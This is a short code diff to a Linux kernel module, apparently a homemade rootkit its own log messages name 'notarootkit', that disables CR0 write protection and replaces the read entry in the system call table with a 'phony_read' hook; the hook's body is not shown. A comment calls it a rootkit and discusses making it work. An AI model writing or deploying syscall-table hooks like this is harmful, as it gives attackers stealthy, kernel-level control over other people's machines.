@@ -50,17 +50,26 @@ int __init loadMod(void){
 	pr_info("module loaded\n");
 	pr_info("sys_call_table pointer is %p\n", sys_call_table);
 
-	//pr_info("sys_read is of type %c\n", (typeof(sys_read)));
+	//pr_info("sys_read is of type %s\n", (typeof(sys_read)).name());
+	pr_info("original read in sys_call_table shown as %p\n", sys_call_table[__NR_read]);
 
 	orig_read = (typeof(sys_read) *)sys_call_table[__NR_read];
 	pr_info("original read stored as %p\n", (void*) orig_read);
+	
 	
 	CR0_WRITE_UNLOCK({
 		sys_call_table[__NR_read] = (void *) &phony_read;
 	});
 	pr_info("sys_call_table injected with phony_read ptr:%p\n", (void *)sys_call_table[__NR_read]);
 
+	/* immediately restores ptr. If uncommented, rootkit is stable (but doesn't work)
 
+	CR0_WRITE_UNLOCK({
+		sys_call_table[__NR_read] = (void *) orig_read;
+	});
+	pr_info("sys_call_table read ptr replaced, now as :%p\n", (void *)sys_call_table[__NR_read]);
+
+	*/
 	/*
 	pr_info("old __NR_mkdir:%p", sys_call_table[__NR_mkdir]);
 	oldNR = (void*)sys_call_table[__NR_mkdir];
@@ -74,8 +83,8 @@ void __exit unloadMod(void){
 	CR0_WRITE_UNLOCK({
 		sys_call_table[__NR_read] = (void *) orig_read;
 	});
-	pr_info("notarootkit unloaded\n");
-
+	pr_info("notarootkit unloading\n");
+	pr_info("sys_call_table read ptr replaced, now as :%p\n", (void *)sys_call_table[__NR_read]);
 	return;
 }
 
